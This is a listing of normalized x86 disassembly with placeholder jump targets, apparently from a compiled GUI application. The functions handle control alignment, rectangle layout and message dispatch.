xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403324
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_434724
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_4124d4
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_41245c
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_4346cc
sub_437048
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_437088
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4338f8
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_4370bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_4371b4
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_433cb4
push ebx
push sub_438b4c
call sub_41a300
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cba0
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_41cd48
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_40344c
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_453478
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403ecc
lea eax [ ebx + 0x188 ]
call sub_403e78
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4371bb
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
sub_4371bb
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_4371e0
push ebx
push esi
push edi
call sub_4034b4
mov ebx edx
mov edi eax
mov eax edi
call sub_419510
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_4054b4
mov eax [ edi + 0x178 ]
call sub_403128
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_432860
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_437e80
mov eax edi
call sub_4380c0
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403128
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_438084
mov esi eax
mov edx esi
mov eax edi
call sub_437eec
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_4380c0
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_433d8c
test bl bl
jle r-xdata
call sub_41a398
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40349c
sub_4372b0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_437374
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_413a58
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403128
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_43b550
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4138b8
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_4139ac
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4138b8
test eax eax
je r-xdata
sub_437384
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_437c28
xor eax eax
push ebp
push sub_4373c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_433ff0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4373cb
mov eax [ ebp - 0x4 ]
call sub_437c30
retn
sub_4373cb
mov eax [ ebp - 0x4 ]
call sub_4372b0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_438a84
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_435d5c
sub_437400
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_43741b ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_43748c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b694
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_41245c
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_43780d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437814
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_437722 ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call sub_405fa4
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_437685
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call sub_405fa4
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_437814
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_437843 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_4378cc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4380c0
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41375c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4138b8
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_43748c
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_438084
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_413934
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_4138b8
mov edx eax
mov ecx ebx
mov eax edi
call sub_437400
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_437a3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_4380c0
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_438084
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_438084
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_437a90
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_437a3c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_437b6f
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_4378cc
pop ecx
push ebp
mov al 0x2
call sub_4378cc
pop ecx
push ebp
mov al 0x3
call sub_4378cc
pop ecx
push ebp
mov al 0x4
call sub_4378cc
pop ecx
push ebp
mov al 0x5
call sub_4378cc
pop ecx
push ebp
mov al 0x6
call sub_4378cc
pop ecx
push ebp
xor eax eax
call sub_4378cc
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403128
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403324
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_437b94
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43b694
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_437c28
xor eax eax
push ebp
push sub_437c1b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_437c30
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_437c58
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_437d1d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4345b8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_4380c0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437d24
mov eax [ ebp - 0xc ]
call sub_403128
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_438084
mov edx eax
mov eax [ ebp - 0xc ]
call sub_41375c
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_434324
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4138b8
xor ecx ecx
mov edx 0xb03e
call sub_435d5c
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_438084
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_437d2c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4380c0
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_437c28
xor edx edx
push ebp
push sub_437e13
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_4380c0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_438084
mov edx eax
mov eax [ ebp - 0xc ]
call sub_41375c
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_4138b8
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403128
mov eax [ ebp - 0x4 ]
call sub_437c30
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_438084
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_4340c8
mov dl 0x4
call sub_4340c8
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_4137a8
sub_437e80
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44c6fc
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_450518
sub_437ea0
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_4334a8
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_4334a8
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_4334a8
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_437eec
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_4334d0
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_4334d0
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_4334d0
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_437f34
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403324
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_435d5c
mov edx ebx
mov eax edi
call sub_437ea0
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_435d5c
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_435d5c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_435d5c
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_435d5c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_435d5c
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax edi
call sub_43b694
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_435d5c
mov eax edi
